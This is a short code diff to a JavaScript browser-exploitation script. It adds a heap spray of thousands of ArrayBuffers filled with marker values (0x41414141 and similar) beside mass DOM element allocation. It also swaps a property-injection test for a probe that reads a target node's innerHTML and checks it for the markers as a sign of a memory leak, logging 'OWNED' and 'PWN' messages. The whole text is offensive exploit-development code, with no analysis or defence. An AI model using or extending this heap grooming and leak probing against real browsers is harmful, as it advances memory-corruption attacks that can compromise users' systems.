@@ -67,6 +67,19 @@ function preciseReclaim(size) {
 
     let bucket = [];
 
+    let ab_views = [];
+
+for (let i = 0; i < 4000; i++) {
+    let buf = new ArrayBuffer(0x100);
+    let view = new Uint32Array(buf);
+
+    view[0] = 0x41414141;
+    view[1] = 0x42424242;
+    view[2] = 0x43434343;
+
+    ab_views.push(view);
+}
+
     for (let i = 0; i < 3000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
@@ -107,7 +120,7 @@ function probe(fsTarget) {
     // innerHTML
     try {
         let html = fsTarget.innerHTML;
-        log("[CHECK] innerHTML = " + html);
+        log("[CHECK] innerHTML = l" + html);
 
         if (html && html.includes("CONTROL_")) {
             log("[!!!] OWNED: CONTROL DETECTADO");
@@ -150,15 +163,22 @@ function probe(fsTarget) {
     try {
     let child = fsTarget.firstChild;
 
-    Object.defineProperty(child, "x", {
-        value: 1337
-    });
+    // leitura suspeita
+    let leak = child.innerHTML;
 
-    log("[PWN] property injection OK");
+    log("[LEAK?] innerHTML = " + leak);
+
+    if (leak && (
+        leak.includes("4141") ||
+        leak.includes("4242") ||
+        leak.includes("4343")
+    )) {
+        log("[!!!] POSSIVEL LEAK DE MEMORIA");
+    }
 
 } catch(e) {
-    log("[PWN] property injection FAIL");
-}
+    log("[LEAK] crash leitura");
+            }
 
     // layout
     try {
